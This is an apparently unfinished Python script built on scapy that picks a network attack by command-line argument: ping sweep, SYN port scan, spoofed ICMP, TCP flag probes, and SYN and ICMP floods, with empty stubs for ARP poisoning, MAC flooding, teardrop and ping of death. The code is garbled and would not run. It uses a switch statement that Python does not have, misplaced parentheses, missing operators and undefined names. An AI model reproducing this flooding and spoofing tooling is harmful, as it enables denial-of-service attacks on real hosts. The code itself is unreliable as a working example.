import scapy.all as scapy
import sys

switch(sys.argv[1]){
         case "ipsweep": scapy.sr(scapy.IP(dst=argv[2]/scapy.ICMP()/argv[3]), inter=0.05);
            break;
         case "portscan": scapy.sr(scapy.IP(dst=argv[2]/scapy.TCP(dport=(1,2000), flags"S")), inter=0.05);
            break;
         case "ipspoof":scapy.sr(scapy.IP(dst=argv[2],src=argv[3]/scapy.ICMP()/argv[4]), inter=0.05);
            break;
         case "SFflag": scapy.sr(scapy.IP(dst=argv[2]/scapy.TCP(flags="SF")), inter=0.05);
            break;
         case "Fflag": scapy.sr(scapy.ip(dst=argv[2]/scapy.TCP(flags="F")), inter=0.05);
            break;
         case "URGflag":scapy.send(scapy.IP(dst=argv[2]/scapy.TCP(flags="U", dport==139)));
            break;
         case "NOflag":scapy.sr(scapy.ip(dst=argv[2]/scapy.TCP(flags="")));
            break;
         case "SYNflood":scapy.send(scapy.ip(dst=argv[2]/scapy.TCP(flags="S", dport=139)),loop=1 inter=0.005);
            break;
         case "ICMPflood":scapy.send(scapy.ip(dst=argv[2]/scapy.ICMP()/argv[3]),loop=1 inter=0.005);

            break;
         case "DropConnection":;
            break;
         case "ICMPredirect":;
            break;
         case "UDPflood":;
            break;
         case "LandAttack":;
            break;
         case "TeardropAttack":;
            break;
         case "PingDeath":;
            break;
         case "ARPpoisoning":;
            break;
         case "MACflood":;
            break;
         case: "PortStealing":;
            break;
         case: "RIPpoisoning":;
            break;
         
         default: print("Invalid your dumb");
               break;
      }
